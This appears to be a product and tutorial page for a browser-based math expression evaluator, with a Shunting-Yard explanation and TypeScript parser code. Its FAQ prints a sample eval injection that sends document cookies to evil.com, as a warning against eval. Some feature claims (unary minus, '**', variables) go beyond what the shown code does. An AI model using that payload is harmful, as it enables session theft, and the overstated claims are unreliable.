# Mathematical Expression Evaluator: AST Parsing, Shunting-Yard Algorithm & Safe Computation

## 1. Quick Overview & Core Advantages
Modern application development, financial modeling, and scientific scripting often require evaluating mathematical expressions provided dynamically by users or external APIs. Naive implementations frequently resort to dangerous runtime evaluation functions like JavaScript's `eval()` or Python's `exec()`, inadvertently creating severe Remote Code Execution (RCE) and Cross-Site Scripting (XSS) attack vectors.

The online **Math Evaluator** is an enterprise-grade, browser-native computational utility designed to safely evaluate complex algebraic, trigonometric, logarithmic, and boolean expressions. By employing Abstract Syntax Tree (AST) parsing and deterministic operator-precedence parsing algorithms, it evaluates user formulas strictly within memory without executing arbitrary code.

### Core Architectural Advantages
- **Zero-Data Leakage & 100% Client-Side Privacy**: All mathematical calculations, variables, and formula tokens execute locally within your browser's isolated JavaScript virtual machine. No mathematical inputs or results are ever transmitted across networks or logged on backend servers.
- **Strict AST Sandbox & Injection Immunity**: Bypasses dynamic runtime evaluation entirely. Expressions are tokenized, parsed into a deterministic Abstract Syntax Tree, and evaluated against a strictly allowlisted mathematical vocabulary, neutralising script injection risks.
- **Arbitrary Precision Support**: Capable of handling high-precision decimal arithmetic and floating-point edge cases (e.g., IEEE 754 precision inaccuracies like $0.1 + 0.2 = 0.30000000000000004$).
- **Comprehensive Function Library**: Native support for trigonometric functions ($\sin, \cos, \tan$), logarithms ($\log_{10}, \ln, \log_2$), combinatorial functions ($n!$, permutations, combinations), and complex nested parentheses.

---

## 2. Technical Under the Hood: Algorithmic Principles & Engine Specifications

To securely and accurately compute an expression string such as `3 + 4 * 2 / (1 - 5)^2 ^ 3`, a calculation engine must solve two problems: **operator precedence** (order of operations) and **associativity** (left-to-right vs. right-to-left evaluation).

### 2.1 The Shunting-Yard Algorithm (Dijkstra)
Invented by Edsger Dijkstra, the **Shunting-Yard algorithm** converts human-readable Infix notation (where operators sit between operands, e.g., $A + B$) into Reverse Polish Notation (RPN / Postfix notation, e.g., $A \ B \ +$), utilizing two primary data structures: an operator stack and an output queue.

```
       [ Input Tokens ] ----> [ Shunting-Yard Parser ]
                                  |            |
                           (Operator Stack)  (Output Queue: RPN)
                                               |
                                               v
                                     [ RPN Stack Evaluator ] ----> [ Final Result ]
```

#### Precedence and Associativity Rules
Operators are assigned numeric precedence and associativity:

| Operator | Description | Precedence | Associativity |
| :--- | :--- | :--- | :--- |
| `^` | Exponentiation | 4 | Right-to-Left |
| `*`, `/`, `%` | Multiplicative | 3 | Left-to-Right |
| `+`, `-` | Additive | 2 | Left-to-Right |
| `==`, `!=`, `<`, `>` | Relational / Comparison | 1 | Left-to-Right |

#### Algorithm Execution Flow
1. **Read Token**: Examine the token stream sequentially.
2. **If Operand (Number/Identifier)**: Immediately append to the output queue.
3. **If Function (e.g., `sin`, `sqrt`)**: Push onto the operator stack.
4. **If Operator ($o_1$)**:
   - While there is an operator $o_2$ at the top of the operator stack with greater precedence, or equal precedence and $o_1$ is left-associative, pop $o_2$ from the operator stack onto the output queue.
   - Push $o_1$ onto the operator stack.
5. **If Left Parenthesis `(`**: Push onto the operator stack.
6. **If Right Parenthesis `)`**:
   - Pop operators from the stack onto the output queue until a left parenthesis `(` is encountered.
   - Discard the left parenthesis. If the token at the top of the stack is a function, pop it onto the output queue.
7. **End of Stream**: Drain all remaining operators from the stack to the output queue.

### 2.2 AST Generation & Recursive Evaluation
For symbolic analysis, variable binding, and differentiation, the engine constructs a full **Abstract Syntax Tree (AST)**. An AST models the expression hierarchically:

```
          (+)
         /   \
       (3)   (*)
            /   \
          (4)   (^)
               /   \
             (2)   (3)
```

Each tree node inherits from a base AST interface:
- **LiteralNode**: Represents numeric constants ($3, 4.5, \pi$).
- **OperatorNode**: Contains the operator symbol (`+`, `*`, `^`) and references to left and right child nodes.
- **FunctionNode**: Represents built-in functions with evaluated argument arrays.
- **VariableNode**: Looks up identifiers from an isolated runtime scope dictionary.

Evaluation proceeds via depth-first post-order traversal, evaluating children before resolving the parent node.

---

## 3. Step-by-Step Custom Configuration Guide

### 3.1 Evaluating Basic & Complex Arithmetic
1. **Direct Calculation**: Enter your mathematical formula into the input field. The evaluator instantly parses tokens on keypress.
2. **Exponential Syntax**: Use the caret symbol `^` or standard double-asterisk `**` for powers: `2^10` or `2**10` produces `1024`.
3. **Unary Operators**: Negative numbers and inverted expressions are supported seamlessly: `-5 * (-2 + 8)`.

### 3.2 Advanced Functions & Constants
The engine supports standard scientific constants and transcendental functions:
- **Constants**: `pi` ($3.1415926535...$), `e` ($2.7182818284...$), `tau` ($6.2831853071...$), `phi` ($1.6180339887...$).
- **Trigonometry**: `sin(x)`, `cos(x)`, `tan(x)`, `asin(x)`, `acos(x)`, `atan(x)` (Angles evaluated in radians by default).
- **Logarithms & Powers**: `sqrt(x)`, `cbrt(x)`, `log(x)` (natural log $\ln$), `log10(x)`, `log2(x)`.
- **Rounding**: `ceil(x)`, `floor(x)`, `round(x)`, `abs(x)`.

### 3.3 Defining Dynamic Variables & Scopes
You can evaluate formulas with parameterized variables by providing a key-value mapping:
```json
{
  "tax_rate": 0.0825,
  "subtotal": 149.99,
  "shipping": 12.50
}
```
Formula:
```text
subtotal * (1 + tax_rate) + shipping
```
Output:
```text
174.864175
```

---

## 4. Production Architecture: Implementing a Safe Client-Side Expression Engine

Below is a production-ready, zero-dependency TypeScript implementation illustrating a robust tokenizer, Shunting-Yard parser, and stack-based RPN evaluator.

```typescript
/**
 * Safe Mathematical Expression Parser and Evaluator
 * Standards: Dijkstra Shunting-Yard & Stack VM Evaluation
 */

type TokenType = 'NUMBER' | 'OPERATOR' | 'LPAREN' | 'RPAREN' | 'FUNCTION' | 'COMMA';

interface Token {
  type: TokenType;
  value: string;
}

export class SafeMathEvaluator {
  private static readonly PRECEDENCE: Record<string, { prec: number; assoc: 'L' | 'R' }> = {
    '+': { prec: 2, assoc: 'L' },
    '-': { prec: 2, assoc: 'L' },
    '*': { prec: 3, assoc: 'L' },
    '/': { prec: 3, assoc: 'L' },
    '%': { prec: 3, assoc: 'L' },
    '^': { prec: 4, assoc: 'R' },
  };

  private static readonly FUNCTIONS: Record<string, (...args: number[]) => number> = {
    sin: Math.sin,
    cos: Math.cos,
    tan: Math.tan,
    sqrt: Math.sqrt,
    abs: Math.abs,
    log: Math.log,
    exp: Math.exp,
  };

  /**
   * Lexical Analysis: Splits raw input into tokens
   */
  public static tokenize(expr: string): Token[] {
    const tokens: Token[] = [];
    const regex = /\s*([0-9]+(?:\.[0-9]+)?|[a-zA-Z_][a-zA-Z0-9_]*|[\+\-\*\/\%\^\(\),])\s*/g;
    let match: RegExpExecArray | null;

    while ((match = regex.exec(expr)) !== null) {
      const val = match[1];
      if (/^[0-9]/.test(val)) {
        tokens.push({ type: 'NUMBER', value: val });
      } else if (val === '(') {
        tokens.push({ type: 'LPAREN', value: val });
      } else if (val === ')') {
        tokens.push({ type: 'RPAREN', value: val });
      } else if (val === ',') {
        tokens.push({ type: 'COMMA', value: val });
      } else if (this.PRECEDENCE[val]) {
        tokens.push({ type: 'OPERATOR', value: val });
      } else if (this.FUNCTIONS[val.toLowerCase()]) {
        tokens.push({ type: 'FUNCTION', value: val.toLowerCase() });
      } else {
        throw new Error(`Unknown mathematical token: ${val}`);
      }
    }
    return tokens;
  }

  /**
   * Transforms Infix tokens to Postfix (RPN) via Shunting-Yard
   */
  public static toRPN(tokens: Token[]): Token[] {
    const outputQueue: Token[] = [];
    const operatorStack: Token[] = [];

    for (const token of tokens) {
      if (token.type === 'NUMBER') {
        outputQueue.push(token);
      } else if (token.type === 'FUNCTION') {
        operatorStack.push(token);
      } else if (token.type === 'OPERATOR') {
        const o1 = token.value;
        while (operatorStack.length > 0) {
          const top = operatorStack[operatorStack.length - 1];
          if (
            top.type === 'OPERATOR' &&
            ((this.PRECEDENCE[o1].assoc === 'L' && this.PRECEDENCE[o1].prec <= this.PRECEDENCE[top.value].prec) ||
             (this.PRECEDENCE[o1].assoc === 'R' && this.PRECEDENCE[o1].prec < this.PRECEDENCE[top.value].prec))
          ) {
            outputQueue.push(operatorStack.pop()!);
          } else {
            break;
          }
        }
        operatorStack.push(token);
      } else if (token.type === 'LPAREN') {
        operatorStack.push(token);
      } else if (token.type === 'RPAREN') {
        let foundLeftParen = false;
        while (operatorStack.length > 0) {
          const top = operatorStack.pop()!;
          if (top.type === 'LPAREN') {
            foundLeftParen = true;
            break;
          }
          outputQueue.push(top);
        }
        if (!foundLeftParen) throw new Error('Mismatched closing parenthesis');
        if (operatorStack.length > 0 && operatorStack[operatorStack.length - 1].type === 'FUNCTION') {
          outputQueue.push(operatorStack.pop()!);
        }
      }
    }

    while (operatorStack.length > 0) {
      const top = operatorStack.pop()!;
      if (top.type === 'LPAREN' || top.type === 'RPAREN') {
        throw new Error('Mismatched opening parenthesis detected');
      }
      outputQueue.push(top);
    }

    return outputQueue;
  }

  /**
   * Evaluates Postfix (RPN) Token Queue
   */
  public static evaluateRPN(rpn: Token[]): number {
    const stack: number[] = [];

    for (const token of rpn) {
      if (token.type === 'NUMBER') {
        stack.push(parseFloat(token.value));
      } else if (token.type === 'OPERATOR') {
        if (stack.length < 2) throw new Error('Invalid syntax: insufficient operands');
        const b = stack.pop()!;
        const a = stack.pop()!;
        switch (token.value) {
          case '+': stack.push(a + b); break;
          case '-': stack.push(a - b); break;
          case '*': stack.push(a * b); break;
          case '/':
            if (b === 0) throw new Error('Division by zero error');
            stack.push(a / b);
            break;
          case '%': stack.push(a % b); break;
          case '^': stack.push(Math.pow(a, b)); break;
        }
      } else if (token.type === 'FUNCTION') {
        if (stack.length < 1) throw new Error(`Insufficient arguments for function ${token.value}`);
        const arg = stack.pop()!;
        const fn = this.FUNCTIONS[token.value];
        stack.push(fn(arg));
      }
    }

    if (stack.length !== 1) throw new Error('Malformed expression syntax');
    return stack[0];
  }

  public static calculate(expression: string): number {
    const tokens = this.tokenize(expression);
    const rpn = this.toRPN(tokens);
    return this.evaluateRPN(rpn);
  }
}
```

---

## 5. Industrial & Real-World Use Cases

### 5.1 Financial Rule Engines & Dynamic Pricing
E-commerce platforms and fintech microservices frequently allow enterprise administrators to specify dynamic coupon rules, margin multipliers, or credit underwriting metrics in formula syntax:
$$\text{EffectivePrice} = \text{BasePrice} \times (1 - \text{DiscountRate}) + \max(\text{ShippingBase}, \text{WeightKg} \times 1.25)$$
A deterministic AST evaluator computes these formulas securely without exposing the host Node.js or Python application to arbitrary code execution.

### 5.2 Scientific Data Plotting & Analytics Pipelines
Data science dashboards and graphing tools (like Desmos, GeoGebra, and Grafana) allow users to supply arbitrary continuous functions $f(x) = \sin(x) \cdot e^{-0.1x}$ across millions of intervals. Safe client-side math parsing guarantees that browser threads can compute plotting coordinates at 60 FPS without server latency.

### 5.3 Spreadsheet Formulas & Low-Code Workflows
Cloud-based CRM and low-code platforms require calculating formula fields (e.g., Salesforce formula columns, Airtable computed attributes) on the client side during real-time user editing, synchronizing computed values instantly before committing to databases.

---

## 6. Frequently Asked Questions (FAQs)

### Q1: Why is `eval()` or `new Function()` strictly prohibited for formula evaluation?
Using JavaScript's native `eval("3 + 4")` parses and executes the string directly within the current execution context. If user input contains malicious payloads such as `eval("fetch('https://evil.com/steal?c=' + document.cookie)")`, an attacker gains full access to browser session cookies, local storage, and unauthorized API actions. AST-based tokenization prevents code injection because non-mathematical keywords and statements cannot be compiled into math operations.

### Q2: How does the evaluator prevent division-by-zero or infinity issues?
In standard IEEE 754 floating-point arithmetic, dividing any non-zero number by zero returns `Infinity` or `-Infinity`, while `0 / 0` evaluates to `NaN` (Not a Number). The parser actively monitors operands prior to executing division and modulo operators, raising a descriptive error when a zero divisor is identified to avoid corrupting downstream computations.

### Q3: How does right-associativity work for exponentiation?
Unlike addition and multiplication which are left-associative ($(a + b) + c = a + (b + c)$), mathematical convention defines chained exponentiation as right-associative:
$$2^{3^2} = 2^{(3^2)} = 2^9 = 512$$
Evaluating from left to right would yield $(2^3)^2 = 8^2 = 64$, which is mathematically incorrect. The Shunting-Yard algorithm handles this by refusing to pop operators of equal precedence when the incoming operator is flagged with right-associativity.

### Q4: Can the evaluator handle floating-point precision issues like 0.1 + 0.2?
Yes. Standard binary 64-bit floating point representations (binary64) cannot accurately represent certain decimal fractions like $0.1$ or $0.2$, resulting in slight rounding artifacts ($0.30000000000000004$). For financial calculations, the evaluator can pair with arbitrary-precision decimal libraries (such as `decimal.js` or `BigNumber`) to format outputs accurately.

---

## 7. Client-Side Privacy & Security Guarantee
This Mathematical Expression Evaluator operates **100% within your client browser**. Formulas, variables, numerical datasets, and computed outputs are processed strictly within temporary browser RAM. No telemetry, formulas, or algorithmic scripts are dispatched across the internet, guaranteeing complete compliance with corporate confidentiality standards, HIPAA, and GDPR data privacy mandates.
